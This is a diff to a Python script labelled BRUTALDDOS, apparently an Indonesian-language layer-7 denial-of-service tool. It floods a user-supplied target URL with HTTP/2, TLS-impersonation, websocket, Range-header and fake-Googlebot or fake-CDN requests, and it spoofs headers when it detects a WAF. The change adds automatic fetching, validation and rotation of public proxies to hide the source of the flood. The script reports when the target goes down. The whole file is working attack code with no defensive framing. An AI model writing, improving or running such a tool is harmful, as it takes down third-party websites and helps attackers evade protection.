@@ -1,4 +1,3 @@
-
 #BRUTALDDOS
 
 import requests, httpx, threading, random, string, time, socket, os, ssl, re
@@ -12,6 +11,7 @@ from threading import Lock, Thread
 TARGET_URL = input("🔗 URL Target (https://example.com): ").strip().rstrip("/")
 MAX_THREADS = int(input("🧵 Jumlah Threads: "))
 ENABLE_VIEW = input("👁️ Aktifkan Spam View? (y/n): ").strip().lower() == 'y'
+USE_PROXY = input("🛡️ Gunakan Proxy? (y/n): ").strip().lower() == 'y'
 
 parsed = urlparse(TARGET_URL)
 TARGET_DOMAIN = parsed.hostname
@@ -25,6 +25,7 @@ last_status_code = 0
 target_status = "🟢 OKE"
 spoof_mode = False
 lock = Lock()
+active_proxies = {}
 
 # 💣 USER AGENT LOADER OTOMATIS
 USER_AGENTS = []
@@ -48,6 +49,43 @@ if os.path.exists(ua_file):
     print(f"✅ Loaded {len(USER_AGENTS)} User-Agent")
 else:
     print("⚠️ File 10k-user-agent.txt tidak ditemukan, pakai User-Agent default.")
+
+# === PROXY LOADER ===
+PROXIES = []
+def load_proxies():
+    sources = [
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+        "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt"
+    ]
+    print("🌐 Mengambil proxy...")
+    for url in sources:
+        try:
+            r = requests.get(url, timeout=10)
+            for p in r.text.splitlines():
+                if ":" in p:
+                    PROXIES.append(p.strip())
+        except:
+            continue
+    print(f"✅ Total proxy dimuat: {len(PROXIES)}")
+
+    # Validasi proxy (opsional)
+    validated = []
+    print("🔍 Validasi proxy...")
+    for p in PROXIES:
+        try:
+            r = requests.get("http://httpbin.org/ip", proxies={"http": f"http://{p}", "https": f"http://{p}"}, timeout=3)
+            if r.status_code == 200:
+                validated.append(p)
+        except:
+            pass
+    PROXIES.clear()
+    PROXIES.extend(validated)
+    print(f"✅ Proxy tervalidasi: {len(PROXIES)}")
+
+if USE_PROXY:
+    load_proxies()
 
 # === UTILITAS ===
 def kotak(text):
@@ -92,6 +130,11 @@ def spoofed_headers():
 def get_headers():
     return spoofed_headers() if spoof_mode else normal_headers()
 
+def get_proxy():
+    if USE_PROXY and PROXIES:
+        return {"http": f"http://{random.choice(PROXIES)}", "https": f"http://{random.choice(PROXIES)}"}
+    return None
+
 # === WAF DETECTION ===
 def detect_waf():
     global spoof_mode
@@ -105,144 +148,114 @@ def detect_waf():
     except:
         print("⚠️ Gagal cek WAF, lanjut default...")
 
-# === VECTORS === (yang cocok di Cloud Shell)
-def attack_http2():
+# === VECTORS === (semua jalan bareng, bukan gantian)
+def request_with_proxy(func):
+    def wrapper():
+        proxy = get_proxy()
+        proxy_id = proxy['http'] if proxy else 'direct'
+        try:
+            func(proxy)
+            if USE_PROXY:
+                with lock:
+                    active_proxies[proxy_id] = active_proxies.get(proxy_id, 0) + 1
+        except:
+            pass
+    return wrapper
+
+@request_with_proxy
+def attack_http2(proxy):
     global last_status_code, sukses, gagal, total_req
-    with httpx.Client(http2=True, timeout=5) as client:
-        while True:
-            try:
-                url = f"{TARGET_URL}/?h2={random.randint(1000,9999)}"
-                r = client.get(url, headers=get_headers())
-                with lock:
-                    last_status_code = r.status_code
-                    sukses += 1
-                    total_req += 1
-            except:
-                with lock:
-                    gagal += 1
-                    total_req += 1
+    with httpx.Client(http2=True, timeout=5, proxies=proxy) as client:
+        url = f"{TARGET_URL}/?h2={random.randint(1000,9999)}"
+        r = client.get(url, headers=get_headers())
+        with lock:
+            last_status_code = r.status_code
+            sukses += 1
+            total_req += 1
 
-def attack_tls_client():
+@request_with_proxy
+def attack_tls_client(proxy):
     global last_status_code, sukses, gagal, total_req
-    sess = Session(client_identifier="chrome_120")
-    while True:
-        try:
-            sess.headers.update(get_headers())
-            url = f"{TARGET_URL}/?tls={random.randint(1000,9999)}"
-            r = sess.get(url, timeout=5)
-            with lock:
-                last_status_code = r.status_code
-                sukses += 1
-                total_req += 1
-        except:
-            with lock:
-                gagal += 1
-                total_req += 1
+    sess = Session(client_identifier="chrome_120", proxy=proxy['http'] if proxy else None)
+    sess.headers.update(get_headers())
+    url = f"{TARGET_URL}/?tls={random.randint(1000,9999)}"
+    r = sess.get(url, timeout=5)
+    with lock:
+        last_status_code = r.status_code
+        sukses += 1
+        total_req += 1
 
-def attack_ws():
+@request_with_proxy
+def attack_ws(proxy):
     global sukses, gagal, total_req
-    try:
-        ws = create_connection(TARGET_URL.replace("http", "ws"), timeout=5)
-        while True:
-            try:
-                ws.send(gen_data())
-                with lock:
-                    sukses += 1
-                    total_req += 1
-            except:
-                with lock:
-                    gagal += 1
-                    total_req += 1
-                break
-        ws.close()
-    except:
-        pass
+    ws = create_connection(TARGET_URL.replace("http", "ws"), timeout=5, http_proxy_host=proxy['http'].split(':')[1][2:] if proxy else None, http_proxy_port=int(proxy['http'].split(':')[2]) if proxy else None)
+    ws.send(gen_data())
+    with lock:
+        sukses += 1
+        total_req += 1
+    ws.close()
 
-def attack_l7_dual():
+@request_with_proxy
+def attack_l7_dual(proxy):
     global last_status_code, sukses, gagal, total_req
-    while True:
-        try:
-            method = random.choice(["GET", "POST", "HEAD"])
-            headers = get_headers()
-            url = f"{TARGET_URL}/?dual={random.randint(1000,9999)}"
-            if method == "POST":
-                r = requests.post(url, headers=headers, data={"data": gen_data()}, timeout=5)
-            else:
-                r = requests.request(method, url, headers=headers, timeout=5)
-            with lock:
-                last_status_code = r.status_code
-                sukses += 1
-                total_req += 1
-        except:
-            with lock:
-                gagal += 1
-                total_req += 1
+    method = random.choice(["GET", "POST", "HEAD"])
+    headers = get_headers()
+    url = f"{TARGET_URL}/?dual={random.randint(1000,9999)}"
+    if method == "POST":
+        r = requests.post(url, headers=headers, data={"data": gen_data()}, timeout=5, proxies=proxy)
+    else:
+        r = requests.request(method, url, headers=headers, timeout=5, proxies=proxy)
+    with lock:
+        last_status_code = r.status_code
+        sukses += 1
+        total_req += 1
 
-def attack_range_header():
+@request_with_proxy
+def attack_range_header(proxy):
     global sukses, gagal, total_req
-    while True:
-        try:
-            headers = get_headers()
-            headers["Range"] = f"bytes=0-{random.randint(100000,999999)}"
-            url = f"{TARGET_URL}/?range={random.randint(1000,9999)}"
-            r = requests.get(url, headers=headers, timeout=5)
-            with lock:
-                sukses += 1
-                total_req += 1
-        except:
-            with lock:
-                gagal += 1
-                total_req += 1
+    headers = get_headers()
+    headers["Range"] = f"bytes=0-{random.randint(100000,999999)}"
+    url = f"{TARGET_URL}/?range={random.randint(1000,9999)}"
+    r = requests.get(url, headers=headers, timeout=5, proxies=proxy)
+    with lock:
+        sukses += 1
+        total_req += 1
 
-def attack_fake_bot():
+@request_with_proxy
+def attack_fake_bot(proxy):
     global sukses, gagal, total_req
-    while True:
-        try:
-            headers = get_headers()
-            headers["User-Agent"] = "Googlebot/2.1 (+http://www.google.com/bot.html)"
-            headers["Referer"] = "https://www.google.com/"
-            url = f"{TARGET_URL}/?bot={random.randint(1000,9999)}"
-            r = requests.get(url, headers=headers, timeout=5)
-            with lock:
-                sukses += 1
-                total_req += 1
-        except:
-            with lock:
-                gagal += 1
-                total_req += 1
+    headers = get_headers()
+    headers["User-Agent"] = "Googlebot/2.1 (+http://www.google.com/bot.html)"
+    headers["Referer"] = "https://www.google.com/"
+    url = f"{TARGET_URL}/?bot={random.randint(1000,9999)}"
+    r = requests.get(url, headers=headers, timeout=5, proxies=proxy)
+    with lock:
+        sukses += 1
+        total_req += 1
 
-def attack_fake_cdn_referer():
+@request_with_proxy
+def attack_fake_cdn_referer(proxy):
     global sukses, gagal, total_req
-    while True:
-        try:
-            headers = get_headers()
-            headers["Referer"] = random.choice([
-                "https://cdn.cloudflare.com/",
-                "https://akamai.com/",
-                "https://fastly.com/"
-            ])
-            url = f"{TARGET_URL}/?cdn={random.randint(1000,9999)}"
-            r = requests.get(url, headers=headers, timeout=5)
-            with lock:
-                sukses += 1
-                total_req += 1
-        except:
-            with lock:
-                gagal += 1
-                total_req += 1
+    headers = get_headers()
+    headers["Referer"] = random.choice([
+        "https://cdn.cloudflare.com/",
+        "https://akamai.com/",
+        "https://fastly.com/"
+    ])
+    url = f"{TARGET_URL}/?cdn={random.randint(1000,9999)}"
+    r = requests.get(url, headers=headers, timeout=5, proxies=proxy)
+    with lock:
+        sukses += 1
+        total_req += 1
 
-def spam_view():
+@request_with_proxy
+def spam_view(proxy):
     global view_sent, total_req
-    while True:
-        try:
-            url = f"{TARGET_URL}/?view={random.randint(100000,999999)}"
-            r = requests.get(url, headers=get_headers(), timeout=5)
-            with lock:
-                view_sent += 1
-                total_req += 1
-        except:
-            with lock:
-                total_req += 1
+    url = f"{TARGET_URL}/?view={random.randint(100000,999999)}"
+    r = requests.get(url, headers=get_headers(), timeout=5, proxies=proxy)
+    with lock:
+        view_sent += 1
+        total_req += 1
 
 def cek_target_status():
     global target_status
@@ -264,13 +277,15 @@ def monitor():
             dv = view_sent - pv
             ps, pg, pv = sukses, gagal, view_sent
             speed = (ds + dg) // 5
-        if target_status == "🔴 DOWN":
-            print("\n‼️ TARGET SAAT INI TUMBANG ‼️\n")
+            top_proxies = sorted(active_proxies.items(), key=lambda x: x[1], reverse=True)[:5]
         print(kotak(f"""
 📊 L7: ✅ Sukses: {sukses} ❌ Gagal: {gagal} 👁️ View: {view_sent} (+{dv})
 📿 CODE: {last_status_code} ⚡️ SPEED: {speed}/s
 🔌 PORT: {TARGET_PORT} 📈 Total Req: {total_req}
 🛁 STATUS: {target_status}
+🌍 Proxy Aktif: {len(active_proxies)}
+🔝 Proxy Top 5:
+{chr(10).join(f"- {k} ({v})" for k, v in top_proxies)}
 """))
 
 def main():
@@ -292,4 +307,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-    
